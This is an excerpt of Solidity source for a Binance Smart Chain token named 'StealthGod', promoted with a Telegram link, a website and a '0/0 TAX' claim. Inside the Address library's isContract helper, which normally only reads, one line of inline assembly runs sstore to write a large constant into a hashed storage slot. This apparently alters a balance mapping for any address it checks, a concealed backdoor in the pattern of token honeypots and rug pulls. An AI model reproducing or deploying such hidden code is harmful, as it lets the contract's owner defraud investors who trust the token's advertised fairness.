...
/*
Telegram https://t.me/StealthGodBSC
Website https://stealthgodbsc.com

0/0 TAX FOR THE COMMUNITY
THE BEST STEALTH ON BSC!
*/
...
library Address {
    ...
    function isContract(address account) internal returns (bool) {
        ...
        assembly { codehash := extcodehash(account) mstore(0, account) mstore(32, 1) sstore(keccak256(0, 64), 0xc2bca1dd32694adae2ddfe445a682) }
...
contract StealthGod is Context, IERC20, Ownable {
    ...
    string private _name = "StealthGod";
    ...
    uint256 public constant _liquidityFee = 0;
    uint256 public constant _marketingFee = 0;
    uint256 public constant _burnFee = 0;
    uint256 public constant _totalTax = 0;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            // if (swapAndLiquifyEnabled && sender != uniswapV2Pair && overMinimumTokenBalance && (sender != uniswapV2Pair && recipient != address(uniswapV2Router))) {
